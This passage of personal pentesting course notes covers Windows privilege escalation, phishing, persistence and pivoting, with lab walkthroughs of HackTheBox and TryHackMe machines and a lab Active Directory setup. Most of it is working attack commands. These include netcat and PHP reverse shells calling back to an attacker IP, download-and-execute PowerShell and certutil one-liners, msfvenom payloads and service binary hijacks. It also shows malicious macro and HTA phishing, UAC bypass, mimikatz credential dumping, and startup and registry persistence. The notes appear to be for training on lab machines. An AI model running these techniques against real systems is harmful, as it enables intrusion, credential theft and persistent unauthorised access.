user&gt; -pw &lt;kali password&gt; -R &lt;port we want to forward&gt;:127.0.0.1:&lt;kali port to receive&gt; &lt;kali ip&gt;   We should gain a kali root shell:  netstat -ano = to show if the port sent is open now winexe -U Administrator%&lt;password reuse&gt; //127.0.0.1 \"cmd.exe\"      hit enter a couple of times, if the shell gets stuck       we should have root access in the windows machine   if we want to improve the shell, we could send a netcat to the target and get the connection   Escalation Path: Windows Subsystem for Linux   Spawning a TTY Shell - https://netsec.ws/?p=337   Impacket Toolkit - https://github.com/SecureAuthCorp/impacket   Overview  EoP - Windows Subsytem For Linux (WSL)   With root privileges WSL allows users to create a bind shell on any port (no elevation needed).   Dont know the root password? No problem, just set the default user to root W/ .exe –default-user root.   Now Start your bind shell or reverse.   if u find user/password and the machine has smb   try psexec/smbexec/wmiexec:  psexec.py &lt;user:'password'@target ip&gt;      it wil test your credential.    Rev shell in PHP:  &lt;?php system('nc.exe -e cmd.exe &lt;kali ip&gt; &lt;port&gt;') &gt;   Escalation via WSL  where /R c:\\windows bash.exe where /R c:\\windows  wsl.exe  &lt;full path of wsl&gt; whoami &lt;full path of wsl&gt; python -c 'bind or reverse shell python code'   If we execute the bash.exe, we are gonna be inside the WSL using Linux:      Get a better shell with pty.spawn   Look at the history   Impersonation and Potato Attacks   Rotten Potato - https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/   Juicy Potato - https://github.com/ohpe/juicy-potato   What are tokens?  Temporary keys that allow you access to a system/network without having to provide credentials each time you access a file. Think cookies for computers.   Two types  Delegate:  Created For logging into a machine or using Remote Desktop   Impersonate:  \"non-interactive\" such as attaching a network drive or a domain logon script   Token Impersonation  in meterpreter:  - getuid - load incognito - list_tokens -u - impersonate_token &lt;domain\\\\user&gt; - shell      When we try to dump LSA for example and we dont have access. We can try impersonate other user and execute as we were him/her    Invoke-Mimikatz -Command '\"privilege::debug\" \"LSADump::LSA /inject\" exit' -Computer &lt;DC.domain.local&gt;  privilege::debug LSADump::LSA /patch   Impersonation Privileges  meterpreter:  getprivs  shell:  whoami /priv   SeAssignPrimaryToken SeImpersonatePrivilege SeTakeOwnership   Potato Attacks  if these are available, we can try juicy potato / rotten potato   SeAssignPrimaryToken SeImpersonatePrivilege   Jeeves htb  Groovy Reverse Shell - https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76   in jenkings:  # search for Script Console # there is a rev shell using groovy, change ip/port and set a listener  # save the systeminfo in case you need to run windows-exploit-suggester.py ./windows-exploit-suggester.py --database &lt;db.xls&gt; --systeminfo &lt;systeminfo file&gt;      if u find vulns related to potato / hot potato / rotten potato. Try these first, cause they are gold    msfconsole   use exploit/multi/script/web_delivery:  set payload to windows/meterpreter/reverse_tcp set target to psh (powershell) set lhost, srvhost      it will generate a payload For us run this payload in the machine, it should generate a session in our meterpreter    run /post/multi/recon/local_exploit_suggester   Escalation  Background the session:  use exploit/windows/local/ms16_075_reflection set options run   meterpreter shell:  load incognito list_tokens -u impersonate_token \"NT AUTHORITY\\SYSTEM\" # root access   Alternate Data Streams  https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/      There is regular data stream and alternate data stream Alternate is a way to hide information within a file    dir /R hm.txt:root.txt:$DATA more &lt; hm.txt:root.txt:$DATA   Escalation Path: getsystem   What happens when I type getsystem? - https://blog.cobaltstrike.com/2014/04/02/what-happens-when-i-type-getsystem/   In meterpreter:  getsystem getsystem -h   What getsystem does?      there is 2 types of named pipe impersonation. One is in memory and other is in disk ( probably u should not run this, because AV detects ) and there is Token Duplication, that requires SeDebugPrivileges to be enable.    Escalation Path: RunAs   Overview  Allow us to run a command as somebody else   FootHold - Access htb  Enter the FTP, grab the files  mdb-sql &lt;db.mdb&gt;    open auth_user  readpst &lt;pst file&gt;      grab user and password   login through telnet   Escalation  cmdkey /list  C:\\Windows\\System32\\runas.exe /user:ACCESS\\Administrator /savecred \"C:\\Windows\\System32\\cmd.exe /c TYPE C:\\Users\\Administrator\\Desktop\\root.txt &gt; C:\\Users\\security\\root.txt\"   Escalation Path: Registry   Overview of Autoruns  C:\\Users\\User\\Desktop\\Tools\\Autoruns\\Autoruns64.exe   C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu “C:\\Program Files\\Autorun Program”   Run powerUp to identify the autorun vulnerabilty:  powershell -ep bypass . .\\PowerUp.ps1 Invoke-AllChecks   Escalation via Autorun  msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; -f exe -o program.exe   in msfconsole:  use multi/handler &gt; set options   Send the program.exe to windows target machine and replace the windows file /Program Files/Autorun Program/program.exe by our program.exe      Now we can disconnect off the machine and log as administrator   the autorun program will pop up.   When u hit RUN, we get the meterpreter shell with root access   AlwaysInstallElevated  This is a configuration issue, when we can run packages with admin privileges, because install elevated is set in the register   Overview  To test if this vulnerability is available:  reg query HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer the value of 'AlwaysInstallElevated' must be 1 reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer again the value must be 1   Escalation  # We can see the AbuseFunction in the PowerUp &gt; Invoke-AllChecks # example: AbuseFunction : Write-UserAddMSI  In Powershell: Write-UserAddMSI      A file UserAdd is gonna appear in the same directory of the PowerUp We will run this file. A window will pop up and we will set a backdoor user to have administrator access    with Meterpreter  use exploit/multi/handler set options  msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;our ip&gt; -f msi -o setup.msi # send to the windows target machine. # make sure u have a listener running &amp; run the setup.msi   Another method  with meterpreter:  use exploit/windows/local/always_install_elevated set the session   Regsvc ACL Overview  We are gonna test if we have full control over a register key.   If the answer is oui, we can compile a malicious executable writen in C and make that executable run a command   Detection  in powershell:  Get-Acl -Path hklm:\\System\\CurrentControlSet\\services\\regsvc | fl # The correct output should be: our current user has FullControl   Escalation  In kali open a FTP server:  python -m pyftpdlib -p 21 --write   In Windows:  # send the file.  ftp &lt;kali ip&gt; &gt; log with anonymous &gt; put windows_service.c   In kali with the file in hand:  # we are gonna edit # replace the command in the payload session &gt; system(\"here\")  cmd.exe /k net localgroup administrator user /add      use sudo apt install gcc-mingw-w64 if needed    x86_x64-w64-mingw32-gcc windows_service.c -o x.exe   Send the x.exe to the C:\\Temp of the Windows Machine:  reg add HKLM\\System\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\\temp\\x.exe /f sc start regsvc net localgroup administrators # the 'user' got added   Escalation Path: Executable Files   Detection   With PowerUp  # we will run &lt;. .\\PowerUp.ps1&gt; Invoke-AllChecks   Manual Detection  C:\\Users\\User\\Desktop\\Tools\\Accesschk\\accesschk64.exe -wvu \"C:\\Program Files\\File Permissions Service\"   Notice that the everyone user group has FILE_ALL_ACCESS permission on the filepermservice.exe file.   Escalation  We will generate the same malicious file:  x86_x64-w64-mingw32-gcc windows_service.c -o x.exe # send the x.exe   Then replace the filepermservice.exe file:  copy /y c:\\Temp\\x.exe \"c:\\Program Files\\File Permissions Service\\filepermservice.exe\" sc start filepermsvc\t net localgroup administrators      The user has been added to the administrator group. We have root access through this user.    Escalation Path: Startup Application   icacls Documentation - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls   Overview  Same concept as the autorun attack, when we boot up our machine an application is gonna to startup.   We will use a malicious file to take advantage of that and get shell   Sadly we wont find this vulnerability with PowerUp.   Detection  icacls.exe \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"  From the output notice that the \"BUILTIN\\Users\" group has Full access '(F)' to the directory  # F = full access # M = modify access # RX = read and execute access # R = read-only access   Escalation  msfconsole listener:  use multi/handler set options  msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; -f exe -o y.exe   Send the exploit to the target machine.      Again, we can open a FTP or web server with python in kali Grab with certutils or just open in the browser    Save the exploit in the startup folder:  C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup      Boot the machine again &amp; just waits with a msfconsole listener to receive the connection    Escalation Path: DLL Hijacking   DLL Hijacking Overview   Dll = dynamic link library   we are looking For a dll that is trying to load and has the name not found;      if we have a writable directory For that dll then   we can hijack that dll by sending a malicious file in that path.   Escalation  Run process monitor:  include to filter &gt; Result is NAME NOT FOUND &amp; Path ends with .dll  sc stop dllsvc sc start dllsvc   grab the windows_dll.c file and edit:  System(\"cmd.exe /k net localgroup administrators userBatman /add\");   Compile it:  x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll   Send to the target:  # python server &gt; grab the file # save the file in a directory you have write access : like C:\\Temp\\  sc stop dllsvc sc start dllsvc   Escalation Path: Service Permissions   Escalation via Binary Paths   Find with PowerUp  powershell -ep bypass . .\\PowerUp.ps1 Invoke-AllChecks   Find manually  accesschk64.exe -uwcv Everyone *  # -u = dont show errors # -w = only show the objects that have write access # -c = display the service name # -v = verbose   Then run against the service itself:  accesschk64.exe -uwcv daclsvc sc qc daclsvc  # if we have write access to the SERVICE_CHANGE_CONFIG sc config daclsvc binpath= \"net localgroup administrators user /add\"  sc stop daclsvc sc start daclsvc  net localgroup administrator  # The user should be there with admin access   Unquoted Service Paths  if you have a service executable which path is not closed with quotation marks and contains a space   then you can get malicious, cause when the service is unquoted, Windows search For the .exe in every space of the ImagePath.   Example:   C:\\ProgramxFiles\\UnquotedxPathxService\\CommonxFiles\\etc   in every x we can put a .exe file and the Windows will run.      We just gotta find one directory that we have write access.   Can be found with PowerUp  powershell -ep bypass . .\\PowerUp.ps1 Invoke-AllChecks   Open a listener:  multi/handler &gt; set options or netcat -lvnp &lt;port&gt;   For meterpreter  msfvenom -p windows/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; -f exe -o common.exe   For netcat:  msfvenom -p windows/reverse_tcp lhost=&lt;kali ip&gt; -f exe -o common.exe      send to the target machine   save in the path of the unquoted vulnerability   sc start unquotedsvc      we should get a shell back    SteelMountain from TryHackMe   HFS - http file server   - Find the version and search in meterpreter - run the exploit - get shell   Escalation Metasploit  upload &lt;powershell.ps1&gt;  we can: echo 'Invoke-AllChecks' &gt;&gt; PowerUp.ps1 After upload: powershell -ep bypass .\\PowerUp.ps1   powerup found unquoted service &gt; AdvancedSystemCareService9   so we can:  sc query &lt;service&gt; # to see more details of it  sc stop &lt;service&gt;   set a listener:  multi/handler set options   msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=&lt;kali ip&gt; -f exe -o ASCService.exe # we can upload through meterpreter  upload &lt;exploit&gt; # and save in the unquoted path that is vulnerable  sc start &lt;service&gt;      we should get a shell.    Escalation Manual   search the exploit using:  searchsploit HFS 2.3 grab the python with remote code execution change ip and port in the script   # set a listener in kali: nc -lvnp &lt;port&gt;   we need open a web server in the same directory as our nc.exe:  python -m http.server 80    Then execute the exploit:  python 39161.py &lt;kali ip&gt; 8080      we should get a shell with user access in our netcat.    Grab the winpeas.exe:  certutil -urlcache -f http://&lt;kali ip&gt;/winPEAS64.exe winpeas.exe      run winpeas   we should find the unquoted service   we will generate with msfvenom again and send to the path of the vulnerable unquoted file   msfvenom -p windows/shell_reverse_tcp lhost=&lt;kali ip&gt; lport=&lt;port&gt; -f exe -o ASCService.exe  # send to the machine with the same method: python -m http.server certutils -urlcache -f http://&lt;kali ip&gt;/ASCService.exe ASCService.exe  sc stop &lt;service&gt; sc start &lt;service&gt;      make sure you have a listener and we should get a shell with admin privileges    Escalation Path: CVE-2019-1388   Zero Day Initiative CVE-2019-1388 - https://www.youtube.com/watch?v=3BQKpPNlTSo   Rapid7 CVE-2019-1388 - https://www.rapid7.com/db/vulnerabilities/msft-cve-2019-1388   Overview   An elevation of privilege vulnerability exists in Windows Certificate Dialog when it does not properly enforce user privileges.   We get the first access with enumeration. Found the credentials in the website   Escalation  We are gonna restore the file that is in the recycle bin   thats reference to our vulnerability cve-2019-1388   we can confirm this by looking at browser history   so we are gonna run this with admin privileges   even tho we do not have the admin credentials   Then we click: Show more details   Then: Show information about the publishers certificate      This is where the vulnerability take place because it will open the browser as SYSTEM    We click: Issued by publishers CA   Close the program windows and go to the browser   In the browser:  go to config/preferences &gt; file &gt; save as... # ignore errors   Type in the file name bar:  c:\\Windows\\System32\\*.* all system32 files will appear search For the **cmd.exe** right click &gt; open whoami      we are root    Capstone           5 machines       Arctic (HTB)       Bastard (HTB)       Alfred (THM)       Bastion (HTB)       Querier (HTB)       Arctic  nothing new.  enumeration... a vulnerable service searchsploit &lt;service&gt; run and get a shell then run something like powerup, windows_vulnerability_check whatever vuln MS010-059 exploit, run &gt; root   Bastard  Basic PowerShell For Pentesters - https://book.hacktricks.xyz/windows/basic-powershell-fFor-pentesters      This time we are gonna run Sherlock.ps1   Add this to the last line:  echo 'Find-AllVuns' &gt;&gt; Sherlock.ps1      MS15-051 found. search in For exploit in git or exploit-db    Send the ms15-051 exploit &amp; nc.exe to the machine then:  ms15-051.exe \"nc.exe &lt;kali ip&gt; &lt;port&gt; -e cmd.exe\" # open a listener   Alfred  jenkins &gt; admin:admin projects &gt; build command nishang systeminfo msfconsole listener msfvenom windows payload  # Grab the file: powershell \"(New-Object System.Net.WebClient).Downloadfile('http://&lt;kali ip&gt;/shell.exe', 'shell.exe')\" python web server etc  # To start the exploit: Start-Process \"shell.exe\"  load incognito getprivs list-tokens -u  # Lets try to impersonate the aythority\\system impersonate_token \"NT AUTHORITY\\SYSTEM\" getuid root      sometimes we have system, but we cant get into shell or use commands so, we need to migrate to another process that is running as system    migrate &lt;svchost.exe PID&gt;   Bastion  Mounting VHD Files - https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25   we are gonna to mount the smb, then mount the VHD file. Then we search For the SAM file.  # C:\\WIndows\\System32\\SAM | SECURITY | SYSTEM  secretdump.py -sam &lt;sam file&gt; -security &lt;security file&gt; -system &lt;system file&gt; LOCAL   - search mRemoteNg - - search where the passwords are stored - - grab the passwords - grab a mRemoteNG decrypt tool from github - crack the admin password - root      hard .-.    Querier  Capturing MSSQL Credentials - https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-smbserver-py-5c29d852f478  # binwalk = to see what files are inside another file # its used in steganography a lot, but we can use in files also binwalk -e &lt;file&gt;   impacket/mssqlclient.py &lt;domain/username:password@&lt;target ip&gt; -windows-auth   in SQL:  SQL &gt; enable_xp_cmdshell   in Kali:  mkdir share impacket/smbserver.py -smb2support share share/   in SQL:  exec xp_dirtree '\\\\&lt;kali ip\\share\\',1,1      This should give us a hash in our smbserver (NTLMv2 hash)       copy the hash in a txt   and try to crack with john   john --show --format=netntlmv2 hash.txt -w=/rockyou.txt hashcat -m 5600 hash.txt rockyou.txt -O   in SQL:  SQL &gt; enable_xp_cmdshell   If we can enable the shell in SQL, we can execute commands:  SQL&gt; xp_cmdshell dir c:\\ # upload a netcat and get a better shell # open a web server in kali, to send a file  xp_cmdshell powershell -c Invoke-WebRequest \"http://&lt;kali ip&gt;/nc.exe\" -OutFile \"C:\\&lt;path&gt;\\nc.exe\" xp_cmdshell C:\\&lt;path&gt;\\nc.exe &lt;kali ip&gt; &lt;port&gt; -e cmd.exe      we get a user shell    # open a web server again: Inside the directory that has PowerUp.ps1 | winpeas | sherlock etc python -m http.server   This will download and execute the powerup from our web server:  echo IEX(New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;:80/PowerUp.ps1') | powershell -noprofile -   if u find a vulnerable service:  sc qc &lt;service&gt;   We can change de binary path and exploit using netcat:  sc config &lt;service&gt; binpath= \"C:\\path\\nc.exe &lt;kali ip&gt; &lt;port&gt; -e cmd.exe\" sc qc &lt;service&gt; =to visualize the new binpath   open a listener  sc stop &lt;service&gt; sc start &lt;service&gt;      we should get a shell back    ","categories": ["notes","pnpt"],
        "tags": ["begginer","pentest","windows","privesc"],
        "url": "/notes/pnpt/winprivesc/",
        "teaser": "/assets/images/posts/pnpt/pnpt-teaser.jpg"
      },{
        "title": "6 - Movement, Pivoting and Persistence",
        "excerpt":"     [INFO] Even though this course is not necessary to pass the PNPT exam, I’m adding it here anyway.    Resources:   Mayor Notes: https://themayor.notion.site/themayor/Pentesting-Notes-9c46a29fdead4d1880c70bfafa8d453a   git: https://github.com/dievus/adgenerator   Share: https://mayorsec-my.sharepoint.com/personal/joe_mayorsec_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fjoe%5Fmayorsec%5Fcom%2FDocuments%2FCourse%20Share%20Drive   MayorSec discord: https://discord.gg/AWx2SxCD69   Lab Setup   Virtual Box Config  File &gt; preferences &gt; Network &gt; add new  External: 192.168.3.0/24 Internal: 192.168.16.0/24 Secure: 10.120.116.0/24   UbuntuMail  Settings &gt; Network &gt; NatNetwork: External   Windows 10x64 Enterprise - Workstation 1  Network &gt;  Adapter1 &gt; Natnetwork: External Adapter2 &gt; Natnetwork: Internal Adapter3 &gt; Natnetwork: Secure   Windows Server 2019  DC01 Natnetwork: Secure Password123!   Machines Config   DC config  https://github.com/dievus/adgenerator      grab the files of this git    Powershell:  Set-ExecutionPolicy Unrestricted &gt; Y . .\\Invoke-ForestDeploy.ps1 &gt; R Invoke-ForestDeploy -DomainName mayorsec.local set a password restart      log using mayorsec&lt;user&gt;   Powershell:  . .\\ADGenerator.ps1 &gt; R Invoke-ADGenerator -DomainName mayorsec.local   Network Adapter &gt; properties &gt; ipv4: 10.120.116.75 255.255.255.0 10.120.116.1 127.0.0.1 8.8.8.8   Workstation 1 - WIndows 10x64  Settings &gt; 2cpus 20gb hd - 2gb ram storage disk file : iso network: 3 adpters = nat network - external - internal - secure  s.chisholm:FallOutBoy1!   Network Adapter (modify the secure network - the 10.* range)&gt; properties &gt; ipv4:  \t10.120.116.10 \t255.255.255.0 \t10.120.116.1 \t10.120.116.75 \t8.8.8.8   Access Work or School &gt; connect &gt; Join this device AD domain &gt; mayorsec.local s.chisholm:FallOutBoy1! &gt; Administrator &gt; restart   \\\\10.120.116.75\\Shared\\ADGenerator &gt; copy nameGen to desktop open Powershell as administrator &gt; Set-ExecutionPolicy Unrestricted &gt; Y    . .\\nameGen.ps1   executeScript -ComputerName WORKSTATION-01  restart &gt; log in and restart again to load the GPO config  edit C:\\Windows\\System32\\drivers\\etc\\hosts   &lt;ubuntuMail IP&gt; mail.mayorsec.com   Workstation 2 - windows10x64  Settings &gt; 2cpus 20gb hd - 2gb ram storage disk file : iso network: 2 adpters = nat network \tinternal \tsecure  m.seitz:Phi11i35@44   Network Adapter (modify the secure network - the 10.* range)&gt; properties &gt; ipv4:  10.120.116.20 255.255.255.0 10.120.116.1 10.120.116.75 8.8.8.8   Access Work or School &gt; connect &gt; Join this device AD domain &gt; mayorsec.local m.seitz:Phi11i35@44 &gt; Administrator &gt; restart  \\\\10.120.116.75\\Shared\\ADGenerator &gt; copy nameGen to desktop open Powershell as administrator &gt; Set-ExecutionPolicy Unrestricted &gt; Y  . .\\nameGen.ps1 executeScript -ComputerName WORKSTATION-02  restart &gt; log in and restart again to load the GPO config  edit C:\\Windows\\System32\\drivers\\etc\\hosts   &lt;ubuntuMail IP&gt; mail.mayorsec.com   UbuntuMail  cpu 1 ram 2gb Settings &gt; Network &gt; Nat Network&gt; external  login as &gt; studentuser:Password123! ip: 192.168.3.4 gateway: 192.168.3.1 dns: 8.8.8.8  edit /etc/hosts   127.0.0.1 mail.mayorsec.com mayorsec.com   &lt;ubuntuMail ip&gt; mail.mayorsec.com mayorsec.com   in Kali: edit /etc/hosts  &lt;ubuntuMail ip&gt; mail.mayorsec.com mayorsec.com   In Workstation 1:  open in the browser the ubuntuMail : 192.168.3.4 (or whatever the ip is) this should open a Roundcube Webmail   Optional:  A Kali Linux Distro is available For the course.  Just make sure the network config is set to 'NAT Network: External' https://1drv.ms/f/s!AlDxd4Hr_BuOrxTds39VMqiV5VjK   Lab Config   DC01  10.120.116.75   W01  s.chisholm - FallOutBoy1! 10.120.116.10   W02  m.seitz - Phi11i35@44 10.120.116.20   Mail  192.168.3.5   Introduction to Command and Control (C2)      C2 is the combination of techniques and tools used by Pentesters and ethical hackers to persist and communicate in a target environment   Tools:   Covenant - https://github.com/cobbr/Covenant  Metasploit - https://github.com/rapid7/metasploit-framework   Introduction to Covenant  cd /opt/Covenant/Covenant dotnet run  studentuser:Password123!   Grunts = user sessions   # In Launchers &gt; Host &gt;   # we can search For a rev shell, this will encode our command # we send to the target windows to grab our revshell and execute it.  example command: powershell -Sta -Nop -Window Hidden -Command \"iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/&lt;revshell.ps1')\"  # Data &gt; Credentials = this functionality will save the credentials we found a long the way                  Session       Id       Value                 0       &gt;0                         medium       local       user                 high       local       admin                 system 0       domain       admin                 system &gt;0       DC       system admin           Gaining the Foothold   https://mayosec.github.io/MayorSecSecuritySolutions/   Enum     Write down names/usernames   we can run namemash.py to transform all gathered names into possible usernames   python3 namemash.py &lt;names-file.txt&gt;   Run owasp ZAP:  attack &gt; fuzz = intruder of burp here we can add username/password as variables and try password spraying/credential stuffing   Phishing DOC  write an email with that access  go to github &gt; nishang Out-Word.ps1  # this will put a malicious macro in your word file save the exploit: notepad &gt; OutWord.ps1   Create a listener in Convenant:  Listeners &gt; httpListener:  name: HTTP Listener ConnectAddresses: &lt;kali ip&gt; ConnectPort: 80 (or another if u want) Save   # Go to Lauchers &gt; Powershell &gt; Generate &gt; Listener: HTTP Listener DotNetVersion: Net40 KillDate: something in the future Generate # Lauchers &gt; Host &gt; url: rev,ps1 &gt; host copy the encoded payload   Go to Workstation-01: where the phishing is happening:  powershell &gt; import OutWord.ps1 = . .\\OutWord.ps1 run the file &gt; OutWord.ps1 -Payload \"paste the encoded payload\" -OutputFile Something.doc now we gotta send the something.doc to the kali machine   in Kali:  smbserver.py Share . -smb2support   Workstation-01:  just drag the file to the share folder      When the word file is open - enable content it will generate a GruntHTTP, that means a session in our Convenant    Host the malicious file:  Convenant &gt; Listeners &gt; Hosted Files &gt; Create &gt; Select the file &gt; Create localhost/file.doc : if its openning to save the file, then is correct   Going on with the phishing:  add a link in the email redirecting to the Kali IP/file.doc &gt; send it everyone that opens that, will generate a shell in our Convenant   Phishing with HTA / HTML   mkdir file.hta &lt;script language=\"VBScript\"&gt; Function DoStuff()   Dim wsh     Set wsh = CreateObject(\"Wscript.shell\")     wsh.run \"&lt;powershell command here&gt;\"     Set wsh = Nothing End Function  DoStuff self.close &lt;/script&gt;   copy the payload to the \"powershell command here\" area. host the file in Convenant   Convenant &gt; Listeners &gt; Hosted Files &gt; Create &gt; Select the file &gt; Create   localhost/file.hta : if its openning to save the file, then is correct   Phishing with Metasploit  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;kali ip&gt; -f hta-psh -o file.hta use multi/handler &gt; set options  python3 -m http.server 80   make sure the link inside the email, is poiting to our kali ip/file.hta when the file is opened - we should get a meterpreter shell      everything works the same, but we are hosting the file via python web server and our listener is meterpreter    Password Spraying Finding   Description:  ABC Organization enables poor password policies in the Roundcube e-mail service which allowed For Account compromise via password spraying.   Remediation:  Require the use of strong password on the Roundcube email server. Refer to organizational password policies \\for guidance and to ensure policies meet industry best practices.   Email Phishing Finding   Description:  ABC Organization allowed the compromise of user workstation in the MayorSec domain through succesful e-mail phishing emails. Emails bypassed AV restrictions due to user disabling services.   Remediation:  Conduct training no less than two times a year that includes identification of suspicious emails, links and attachments. Generate a domain-wide Group Policy Object that prevents local users from disabling anti-virus on devices.   Enumeration the Local Machine, Privilege Escalation and Local Persistence   Local Enumeration   With Covenant  in the Covenant shell:  seatbelt -group=all  GetDomainUser GetNetLoggedOnUser GetNetLocalGroup LocalUsers GetDomainComputer   With Metasploit  in meterpreter shell:  sysinfo getuid ipconfig arp netstat -ano run post/windows/gather/enum_services run post/windows/gather/enum_applications run post/windows/gather/enum_domains route   AutoLogon Misconfiguration and Exploitation   Workstation-01  # HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\AutoAdminLogon &gt; set 1  New &gt; String Value &gt; DefaultUserName &gt; set s.chisholm New &gt; String Value &gt; DefaultPassword &gt; set FallOutBoy1! New &gt; String Value &gt; DefaultDomainName &gt; set mayorsec restart the machine   Covenant  Create a listener with there is not one Launcher &gt; Powershell &gt; set options &gt; copy the payload   Workstation-01  powershell -Sta -Nop -Window Hidden -EncodedCommand \"payload from covenant\" this will generate a shell in covenant   In Covenant Shell  PowerShellImport &gt; browse &gt; PowerUp.ps1 powershell Invoke-AllChecks Seatbelt WindowsAutoLogon SharpUp audit   AlwaysInstallElevated Misconfiguration and Exploitation   Computer\\HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer  &gt; set AlwaysInstallElevated to 1   Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\  &gt; New &gt; Key &gt; Installer &gt; New &gt; Key &gt; DWORD (32-bit) Value &gt; AlwaysInstallElevated set AlwaysInstallElevated to 1   In Covenant Shell:  sharpup audit PowerShellImport &gt; browse &gt; PowerUp.ps1 powershell Invoke-AllChecks      Here we are looking for AlwaysInstallElevated Registry Keys - HKLM | HKCU This vulnerability give us privilege escalation opportunity.       [*] Checking for AlwaysInstallElevated registry key… AbuseFunction : Write-UserAddMSI    msfvenom -p windows/exec CMD=\"revshell payload from covenant\" -f msi -o installer.msi   In Covenant Shell:  upload C:\\Users\\Public\\installer.msi &gt; browse &gt; grab the installer.msi ChangeDirectory C:\\Users\\Public ls = to verify if your payload is here shell msiexec /quiet /qn /i installer.msi this should give us an elevated revshell with authority\\system access   with Metasploit:  # we can get a shell with: multi/script/web_delivery  # in meterpreter shell session: getuid run post/multi/recon/local_exploit_suggester ctrl+z = to background the session use exploit/windows/local/always_install_elevated set options exploit = ( -j to run in the background if u want) we get a authority\\system shell ps = to show processes      we can migrate to a SessionID that has 1 as value &amp; is from authority\\system = so we get more privileges usually winlogon.exe. Grab the PID of this process    migrate &lt;PID&gt; sysinfo      now we have a better shell    FodHelper UAC Bypass with Covenant   FodHelper is a trusted WIndows binary, that u can use to bypass UAC we are going from local user to local administrator   PowerShellImport &gt; browse &gt; helper.ps1 powershell helper -custom \"cmd.exe /c &lt;revshell payload from covenant&gt;\" local user to local administrator shell  # Launcher &gt; ShellCode &gt; Net40 &gt; Generate &gt; Download &gt; save the file   Covenant  Inject &gt; ProcessID ( PID of a SessionId &gt;0 that has system access, usually winlogon.exe ) browse &gt; select our shellcode file # we should get authority\\system access   [+] Extra Info  So the level Integrity of the escalation went:  Medium: local user High: local admistrator System: authority\\system    With Meterpreter  Get an initial shell:  run post/multi/recon/local_exploit_suggester use exploit/windows/local/bypassuac_dotnet_profiler set options exploit -j   Go to the new session:      we are local admin , lets escalate even more    ps = to show processes   lets migrate to a process that has:  # SessionID=1 &amp; authority\\system access migrate &lt;PID&gt;  # again, usually winlogon.exe its a good choice   [+]      You may not always get a machine that has SessionID=1 processes.       Keep in mind that perhaps you need to generate a new user, grant him administrator back access in the local machine.       And then you might need to log with that user to get SessionId=1    Persistence   New User Persistence  in Covenant:  if u have local admin access (high integrity)  shellcmd net users &lt;newuser&gt; &lt;password&gt; /add shell net users = to see if our user was created shell net localgroup administrators &lt;newuser&gt; /add   StartUp Persistence  In Covenant:  # we will need a local admin (high integrity) access too Launcher &gt; powershell &gt; revshell &gt; copy the encoded payload Grunts &gt; click in the session &gt; Task &gt; PersistStartup &gt; paste de payload &gt; name and click Task      This will send the malicious file to the startup directory in the Windows targert machine it will give us shell back, even after restart    To clean:  Just delete the file from startup directory   Autorun Persistence  In Covenant:  # we will net a local admin (high integrity) access Launcher &gt; binary &gt; Net40 &gt; generate &amp; Download &gt; save the file Grunts &gt; click in the high session &gt; Task &gt; PersistAutorun &gt; copy the value path &gt;  open a new tab &gt; click in the shell of the high session &gt; upload &gt; paste the value path &gt; select the file now go back to the first tab and click Task to finish      if u want to see the process in the target machine:  go to register &gt; HKCU\\Software\\Microsoft\\windows\\CurrentVersion\\Run    OR   in covenant shell:  \tGetRegistryKey HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run # this will show the register in the machine      After restarting the target windows machine we should get a shell back in Covenant    To clean:  delete the register delete the autorun file in C:\\Users\\Public\\autorun   Persistence via RDP  Workstation-01 &gt; Remote Desktop Settings = off  in Covenant shell: powershell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup \"Remote Desktop\"      This command enables Remote Desktop.    In Kali:  xfreerdp /u:&lt;user&gt; /p:'password' /v:&lt;target ip&gt;   [+] Disable the firewall   The RDP persistence is very valuable, because it give us a GUI. So its easy to look.   In case you want disable the firewall rule, its the same command but change the  {/d 0 -&gt; /d 1} and {Enable-NetFirewallRule -&gt; Disable-NetFirewallRule}   Disable the firewall rule:  powershell reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup \"Remote Desktop\"   Port Forward   Session Passing to Metasploit      if we have a session in covenant of any integrity and need to use port forwarding, autoroute etc we can pass the session to the metasploit, because covenant does not have that functionality    msfconsole:  search web_delivery use exploit/multi/script/web_delivery set target 2 = powershell set payload windows/x64/meterpreter/reverse_http  set others options exploit -j copy the payload      the reverse_http its better than reverse_tcp to evade detection    Go to Covenant Shell:  powershell &lt;paste the payload&gt; # this will give a session to metasploit   Routing Functions  In meterpreter session:  ipconfig # to see which route we wanna open run autoroute -s &lt;192.168.16.0/24&gt; run autoroute -p # to check the routes   Port Forwarding      The Traffic sent from inside the network that we dont have access, can be forward to a device that we do 